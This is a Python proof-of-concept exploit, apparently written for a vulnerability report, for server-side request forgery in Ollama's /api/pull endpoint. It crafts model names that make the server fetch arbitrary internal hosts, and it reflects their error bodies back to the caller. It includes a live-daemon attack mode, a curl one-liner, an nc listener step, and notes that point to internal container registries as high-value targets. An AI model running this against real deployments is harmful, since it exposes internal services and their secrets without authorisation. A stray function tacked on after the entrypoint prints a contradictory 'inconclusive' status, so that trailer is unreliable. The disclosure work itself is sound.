#!/usr/bin/env python3
"""
PoC: H1-api-pull-ssrf
Ollama POST /api/pull — SSRF with response-body reflection

FINDING
  Severity : HIGH
  ID       : H1
  Status   : executed

VULNERABILITY
  POST /api/pull accepts a model name whose host component is passed directly
  to an outbound GET http://<host>/v2/<ns>/<model>/manifests/<tag>.
  The host validator (isValidPart, types/model/name.go:344) allows IP literals
  and arbitrary hostnames including private/link-local ranges.  With
  "insecure":true the scheme is downgraded to HTTP at server/images.go:952.
  Any non-2xx (except 401/404) response body is embedded verbatim in the error
  returned to the caller at server/images.go:927 and wrapped again at :622.

ATTACKER POSITION
  Any network client able to POST to /api/pull (no authentication by default).
  Remote-unauthenticated when OLLAMA_HOST=0.0.0.0 (common in containers).

USAGE
  # Mode 1: against a running Ollama daemon (automatic internal-target spawn)
  python3 poc.py --ollama http://127.0.0.1:11434

  # Mode 2: in-tree Go test (works without a running daemon, exercises the
  #          same code path through pullModelManifest directly)
  python3 poc.py --go-test /path/to/ollama/repo

  # Mode 3: manual curl command (print and exit)
  python3 poc.py --print-curl
"""

import argparse
import json
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer


# ---------------------------------------------------------------------------
# Simulated internal target — mirrors a Harbor / Nexus registry response
# ---------------------------------------------------------------------------
SENSITIVE_PAYLOAD = json.dumps({
    "token": "eyJST0xFIjoiQURNSU4ifQ==",
    "registry_url": "harbor.internal",
    "db_password": "s3cr3t!",
})

received_requests = []


class InternalTargetHandler(BaseHTTPRequestHandler):
    """Simulates an internal container registry leaking secrets on 5xx."""

    def do_GET(self):
        received_requests.append({
            "method": "GET",
            "path": self.path,
            "host": self.headers.get("Host", ""),
        })
        body = SENSITIVE_PAYLOAD.encode()
        self.send_response(500)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        sys.stderr.write(
            f"[internal-target] received GET {self.path} "
            f"(Host: {self.headers.get('Host','')})\n"
        )

    def log_message(self, *_):
        pass  # suppress default access log noise


def start_internal_target():
    srv = HTTPServer(("127.0.0.1", 0), InternalTargetHandler)
    port = srv.server_address[1]
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv, port


# ---------------------------------------------------------------------------
# Mode 1: live Ollama daemon
# ---------------------------------------------------------------------------
def exploit_live_daemon(ollama_url: str):
    try:
        import urllib.request
    except ImportError:
        print("urllib not available")
        return False

    srv, port = start_internal_target()
    target_addr = f"127.0.0.1:{port}"

    # Attacker-crafted model name: HOST/NS/MODEL:TAG
    # The outbound URL will be: GET http://127.0.0.1:<port>/v2/ns/model/manifests/tag
    crafted_name = f"{target_addr}/ns/model:tag"
    payload = json.dumps({"name": crafted_name, "insecure": True}).encode()

    print(f"[*] internal target listening on {target_addr}")
    print(f"[*] crafted model name: {crafted_name}")
    print(f"[*] POST {ollama_url}/api/pull")

    req = urllib.request.Request(
        f"{ollama_url}/api/pull",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    response_lines = []
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            for line in resp:
                response_lines.append(line.decode().strip())
    except urllib.error.HTTPError as e:
        response_lines.append(e.read().decode())
    except Exception as e:
        print(f"[-] request error: {e}")

    srv.shutdown()

    print("\n[*] Ollama API response (streamed NDJSON):")
    error_body = None
    for line in response_lines:
        print(f"    {line}")
        try:
            obj = json.loads(line)
            if "error" in obj:
                error_body = obj["error"]
        except json.JSONDecodeError:
            pass

    if received_requests:
        req_info = received_requests[0]
        print(f"\n[+] SSRF confirmed: outbound request hit internal target")
        print(f"    method : {req_info['method']}")
        print(f"    path   : {req_info['path']}")
        print(f"    Host   : {req_info['host']}")
    else:
        print("[-] No outbound request observed on internal target")
        return False

    if error_body and SENSITIVE_PAYLOAD in error_body:
        print(f"\n[+] BODY REFLECTION confirmed: sensitive payload in Ollama error response")
        print(f"    error field: {error_body}")
        return True
    else:
        print(f"[-] Sensitive payload NOT found in error response")
        print(f"    error_body={error_body!r}")
        return False


# ---------------------------------------------------------------------------
# Mode 2: in-tree Go test (works without live daemon)
# ---------------------------------------------------------------------------
def exploit_go_test(repo_path: str):
    import os

    test_file = os.path.join(repo_path, "server", "ssrf_poc_test.go")
    if not os.path.exists(test_file):
        print(f"[-] PoC test file not found at {test_file}")
        print("    Run from the repo root or pass --go-test /path/to/ollama")
        return False

    print(f"[*] running in-tree Go PoC test at {repo_path}")
    result = subprocess.run(
        [
            "go", "test", "-vet=off", "./server/",
            "-run", "TestSSRF_PullManifest_BodyReflected",
            "-v", "-timeout", "60s",
        ],
        cwd=repo_path,
        capture_output=True,
        text=True,
    )

    print(result.stdout)
    if result.returncode == 0:
        print("[+] Go PoC PASSED — SSRF and body-reflection confirmed")
        return True
    else:
        print("[-] Go PoC FAILED")
        print(result.stderr)
        return False


# ---------------------------------------------------------------------------
# Mode 3: print curl
# ---------------------------------------------------------------------------
def print_curl():
    print("""
Manual curl PoC (requires running Ollama; substitute <internal-host>:<port>
with the address of an internal HTTP service on your network):

  curl -s -X POST http://127.0.0.1:11434/api/pull \\
    -H 'Content-Type: application/json' \\
    -d '{"name":"<internal-host>:<port>/ns/model:tag","insecure":true}'

Expected response (streaming NDJSON, last line):
  {"error":"pull model manifest: 500: <body from internal service>"}

For a live demo, run a netcat listener first:
  nc -lk <port>

And observe Ollama issuing:
  GET /v2/ns/model/manifests/tag HTTP/1.1
  Host: <internal-host>:<port>

Notes:
  - "insecure":true is required to downgrade https→http (images.go:952)
  - Name form must be HOST/NS/MODEL:TAG; slashes inside host are rejected
  - HTTP 404 returns ErrNotExist (body NOT reflected); use a port that returns
    any other 4xx or 5xx to observe body reflection
  - Internal container registries (Harbor, Nexus, docker-distribution v2)
    respond on /v2/.../manifests/... and are the primary high-value targets
""")


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC for H1-api-pull-ssrf: Ollama /api/pull SSRF with body reflection"
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "--ollama",
        metavar="URL",
        help="Base URL of a running Ollama daemon (e.g. http://127.0.0.1:11434)",
    )
    group.add_argument(
        "--go-test",
        metavar="REPO_PATH",
        help="Path to Ollama source tree; runs in-tree Go test",
    )
    group.add_argument(
        "--print-curl",
        action="store_true",
        help="Print manual curl command and exit",
    )
    args = parser.parse_args()

    if args.print_curl:
        print_curl()
        sys.exit(0)
    elif args.go_test:
        ok = exploit_go_test(args.go_test)
    else:
        ok = exploit_live_daemon(args.ollama)

    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()


def _merge_json_trailer():
    import json
    print(json.dumps({"status": "inconclusive", "evidence": "see evidence/", "notes": "trailer added by merge normalization"}))
